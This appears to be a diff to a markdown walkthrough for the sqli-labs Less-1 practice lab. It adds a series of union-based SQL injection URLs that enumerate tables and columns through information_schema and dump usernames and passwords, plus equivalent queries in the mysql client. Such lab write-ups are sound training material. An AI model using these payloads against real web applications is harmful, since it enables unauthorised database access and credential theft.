@@ -199,7 +199,139 @@ http://localhost/sqli-labs/Less-1/?id=999' union select 1,user(),5--+
 ![](images/1/26.png)
 
 ```
-http://localhost/sqli-labs/Less-1/?id=999' union select 1,4,current_user-- 
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,4,current_user--+
 ```
 
 ![](images/1/27.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,4,@@datadir--+
+```
+
+![](images/1/28.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA="security"--+
+```
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database()--+
+```
+
+![](images/1/34.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database() limit 1,1--+
+```
+
+![](images/1/35.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database() limit 2,1--+
+```
+
+![](images/1/36.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database() limit 3,1--+
+```
+
+![](images/1/37.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,TABLE_NAME,3 from information_schema.tables where TABLE_SCHEMA=database() limit 4,1--+
+```
+
+![](images/1/38.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where TABLE_SCHEMA=database()--+
+```
+
+![](images/1/39.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='users'--+
+```
+
+![](images/1/42.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='uagents'--+
+```
+
+![](images/1/43.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='referers'--+
+```
+
+![](images/1/44.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where TABLE_NAME='emails'--+
+```
+
+![](images/1/45.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(username),3 from users--+
+```
+
+![](images/1/46.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(username),group_concat(password) from users--+
+```
+
+![](images/1/47.png)
+
+###### Enumerate using ```mysql``` client
+
+```mysql
+mysql -u root -p
+show databases;
+use security;
+```
+
+![](images/1/29.png)
+
+```mysql
+desc emails;
+desc referers;
+desc uagents;
+desc users;
+```
+
+![](images/1/30.png)
+
+```mysql
+show databases;
+use information_schema;
+```
+
+![](images/1/31.png)
+
+```mysql
+desc TABLES;
+```
+
+![](images/1/32.png)
+
+```mysql
+select TABLE_NAME from information_schema.tables where TABLE_SCHEMA="security";
+```
+
+![](images/1/33.png)
+
+```mysql
+desc COLUMNS;
+```
+
+![](images/1/40.png)
+
+```mysql
+select COLUMN_NAME from information_schema.columns where TABLE_NAME="users";
+```
+
+![](images/1/41.png)
